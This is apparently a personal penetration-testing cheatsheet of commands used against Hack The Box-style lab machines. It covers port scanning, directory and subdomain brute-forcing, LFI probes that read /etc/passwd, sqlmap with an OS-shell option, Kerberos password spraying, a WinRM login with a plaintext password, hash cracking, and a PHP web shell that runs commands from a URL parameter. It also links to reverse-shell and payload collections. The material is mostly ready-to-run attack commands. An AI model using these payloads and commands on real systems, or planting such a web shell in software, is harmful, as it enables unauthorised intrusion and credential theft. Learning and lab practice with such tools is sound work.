# CIBERSECURITY CHEATSHEET - polgs
# INITIAL SCANS
## ping
**Ping 1 packet:**
```s
ping -c 1 
```
linux -> 64 ttl
windows -> 128 ttl
## nmap
**Scan fast and easy:**
```s
sudo nmap -p- 10.129.156.47 -vvv 
```


**Scan all ports and save to nmap/allPorts (Folder must exist):**
```s
nmap -p- -oA nmap/allPorts 10.129.156.47
```

**BIG GUNS NMAP**
```s
sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.129.101.26 -oG allPorts | grep port
```

**Scan versions and scripts:**
```s
nmap -sV -sC -oA nmap/search
```
**Scan fast and loud:**
```s
nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.152 -oG allPorts
```
**Scan udp ports:**
```s
sudo nmap -p 1-500 -sU -T4 10.10.11.152 -Pn
```

# WEB ENUMERATION
## gobuster
**Directory enumeration:**
```s
gobuster dir --url artcorp.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 25  > gobuster_dir.txt
```
```s
gobuster dir -u <url> -w <wordlist_file.txt> -x <file_extensions>
```
```s
gobuster dir -u http://workers.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,php3,html
```
**Find subdmains using:**
```s
gobuster dns -t 30 -w /usr/share/wordlists/subdomains-top1million-110000.txt -d artcorp.htb
```
```s
gobuster vhost -w /usr/share/wordlists/subdomains-top1million-110000.txt -u http://thetoppers.htb
```
Optionally use "--append-domain" flag
```s
gobuster dns -d <domain> -w <word_list.txt> -i
```
```s
gobuster dns -d workers.htb -w /home/username/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -i
```
**Optional**
Use dns proxy to have wildcards on et/hosts (*.pol.com)
https://github.com/hubdotcom/marlon-tools/blob/master/tools/dnsproxy/dnsproxy.py
## nmap
**fast enum:**
```s
nmap --script http-enum -p80 10.129.95.187
```
## wfuzz
**Enum filename:**
```s
wfuzz -c --hc 404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.10/FUZZ.php
```
**Testing php parameter for LFI:**
```s
wfuzz -c --hw=0 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://10.10.10.10/login.php?FUZZ=/etc/passwd"
```
***Decode Payload***
```s
curl -s -X GET "http://10.10.10.10/login.php?login=php://filter/convert.base64-encode/resource=/etc/passwd" | base64 -d; echo
```
## Online tools
whatweb
whappalizer

# Web Exploitation

#AWS Amazon S3
```s
aws configure
```
We can list all of the S3 buckets hosted by the server by using the ls command.
```s
aws --endpoint=http://s3.thetoppers.htb s3 ls
```
We can also use the ls command to list objects and common prefixes under the specified bucket.
```s
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```



## sqlmap
```s
GET request
sqlmap -u http://10.129.7.81/dashboard.php?search=a -p id

sqlmap -u http://site-to-test.com/test.php?id=1*

-u: URL to scan

-p: parameter to scan

*: Parameter to scan (if -p switch is not provided)

POST request
We can provide the data being passed in the POST request body to scan by the SQLMap tool.

sqlmap -u http://site-to-test.com/admin/index.php –data=”user=admin&password=admin” -p user

–data = POST data

PHP + SQL parameter (with cookie authentification)
sqlmap --cookie=PHPSESSID=0r7rr0vcsrekau1453acmvdrg5 --os-shell -u http://10.129.7.81/dashboard.php?search=a
```
**Use --os-shell Prompt for an interactive operating system shell**





# SMB Active Directory

## Enumeration: 
### Shares
![image](https://user-images.githubusercontent.com/19478700/214690302-187aaf2a-b88e-4461-ad92-c8e5241239b2.png)

![image](https://user-images.githubusercontent.com/19478700/214690049-e84959e2-77d8-4843-b0cc-3aa2b17b1c50.png)

Get basic information on shares:
```s
cme smb IPADDR
```
```s
nmap --script=smb-enum-shares -p "139,445" 
```
```s
smbclient -N -L
```
```s
smbmap -H 10.10.11.152
```
![image](https://user-images.githubusercontent.com/19478700/213701493-aea51ee8-7705-4d1c-90e0-b2899c99ff67.png)

### Users

**Kerbrute**

Enumerate users:
```s
./kerbrute_linux_amd64 userenum --dc IPADD -d URL users.txt
```
Password Spray: Test a single password against a list of users
```s
./kerbrute_linux_amd64 passwordspray -d URL users.txt 'password123'
```
Possible errors:
Check for clock (+400.)
```s
ntpdate -q IP
```
Fix:
```s
sudo date -s 01:22
ntpdate IP
date
```


## Access share
### smbclient
smbclient \\\\10.129.95.187\\backups
-> cd, ls get ....
Connect using password:
evil-winrm -i 10.129.228.204 -u Administrator -p 'badminton'

![image](https://user-images.githubusercontent.com/19478700/214691178-b4aaf701-efda-4d83-97b2-9143d05be73c.png)


conncet using cert and priv key:

## Get NTLM hash
![image](https://user-images.githubusercontent.com/19478700/214714186-e3876353-c3fe-4cd1-99e8-789f7135cea5.png)
![image](https://user-images.githubusercontent.com/19478700/214714312-f5b2151e-a0a4-4454-b329-a59532432865.png)
## Host share server
![image](https://user-images.githubusercontent.com/19478700/214715933-ca7cdb35-89da-4b7b-8a53-f5ce63e1c582.png)
#### to copy files to share:
![image](https://user-images.githubusercontent.com/19478700/214716094-ff65b350-30a0-4c31-a8b2-beee12dab2dc.png)


## Post ex
### C# offensive tools
https://github.com/Flangvik/SharpCollection
eg sharphound -> bloodhound AD rights and relations

# Cracking
## Crack ssh ftp mysql users using wordlists:
cme ->Crackmapexec

## FTP
### Test ftp user wordlist using hydra:
![image](https://user-images.githubusercontent.com/19478700/211882774-b0a7dab7-2da4-4195-a7e9-230ce8a87c34.png)


## Zips:
fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt


Cracking pfx:
pfx2john legacyy_dev_auth.pfx > pfx_john_legacy.hash
john -w=/usr/share/wordlists/rockyou.txt pfx_john_legacy.hash


# Terminal Ninja
## grep
**Filter txt from some words:**
```s
cat file.txt | grep -v 'Image\|Manager'
```
**Filter txt from endlines:**
```s
cat file.txt | grep .
```


# Payloads
https://github.com/swisskyrepo/PayloadsAllTheThings
## Interactive reverse shell windows
https://github.com/antonioCoco/ConPtyShell

## PHP
**Php one liner tat executes parameter commands:**
shell.php:
```php
<?php system($_GET["cmd"]); ?>
``` 
http://thetoppers.htb/shell.php?cmd=id
The response from the server contains the output of the OS command id



## Log4j
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Log4Shell.md

## Reverse Shell Generator
https://www.revshells.com

# Social Engineering
## Emails from console
![image](https://user-images.githubusercontent.com/19478700/214691713-035aa13f-7199-46d4-94b8-bebba78af555.png)

# Dictionary Generation
```s
cewl
```




